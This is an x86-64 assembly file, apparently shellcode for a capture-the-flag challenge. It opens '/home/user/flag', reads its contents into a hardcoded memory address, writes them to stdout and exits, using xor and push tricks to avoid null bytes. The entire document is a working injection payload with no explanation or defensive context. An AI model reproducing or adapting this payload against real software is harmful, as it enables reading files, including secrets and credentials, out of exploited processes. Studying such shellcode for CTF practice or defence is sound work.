#include <sys/syscall.h>

.globl	main
.type	main, @function

main:

// fd = open("/home/user/flag", 0)
xor		%rdx, %rdx
push	%rdx
mov		$0x67616c662f726573, %rdi
push	%rdi
mov		$0x752f656d6f682f2f, %rdi
push	%rdi
mov		%rsp, %rdi
xor		%rsi, %rsi
xor		%rax, %rax
mov		$0x2, %al
syscall

// addr = 0x4b40c0
// read(fd, addr, 0xff)
mov		%rax, %rdi
mov		$0x4b40c0, %rsi
xor		%rdx, %rdx
mov		$0xff, %dl
xor		%rax, %rax
syscall

// write(1, addr, 0xff)
xor		%rdi, %rdi
inc		%rdi
mov		$0x4b40c0, %rsi
xor		%rdx, %rdx
mov		$0xff, %dl
xor		%rax, %rax
inc		%rax
syscall

// exit
xor		%rdi, %rdi
mov		$0x3, %dl
xor		%rax, %rax
mov		$0x3c, %al
syscall
